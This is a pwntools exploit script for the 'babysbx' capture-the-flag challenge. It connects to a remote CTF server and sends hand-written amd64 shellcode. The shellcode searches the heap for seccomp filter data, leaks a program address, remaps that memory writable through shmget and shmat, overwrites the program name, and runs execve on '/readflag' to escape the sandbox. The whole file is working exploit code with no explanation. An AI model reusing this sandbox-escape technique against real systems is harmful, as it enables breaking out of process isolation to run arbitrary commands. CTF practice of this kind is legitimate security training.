#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("babysbx_patched")

host, port = "blackhat.flagyard.com","31288"
p = remote(host,port)

shellc = asm('''
  /* leak heap address */
   movd rax, xmm0
   movabs rbx, 0x0000000200240015
   /* search for seccomp on heap */
search:
   cmp [rax],rbx
   jz ok1
   add rax,8
   jmp search
ok1:
   add rax,0xb4
   mov ebx,dword ptr[rax]
   shl rbx,32
   mov ecx,dword ptr[rax+0x10]
   or rbx,rcx
   mov r15,rbx
   sub r15,0x50
   /* leak fixed program address */

   /* shmget */
   mov edi,0x4d2
   mov esi,0x400
   mov edx,0x3b6
   mov eax,29
   syscall

   /* remap zone with shmat as rw */
   mov edi,eax
   mov rsi,r15
   mov edx, 16384
   mov eax,30
   syscall

   /* overwrite program name */
   mov rdi,rax
   add rdi,0x50
   mov rbx,cmd[rip]
   mov [rdi],rbx
   mov rbx,cmd+8[rip]
   mov [rdi+8],rbx

   /* execve */
   xor esi,esi
   xor edx,edx
   mov eax,59
   syscall

cmd:
   .string "/readflag"
''')

p.sendafter('shellcode: ', shellc.ljust(0xfd8, b'\x90'))
p.interactive()

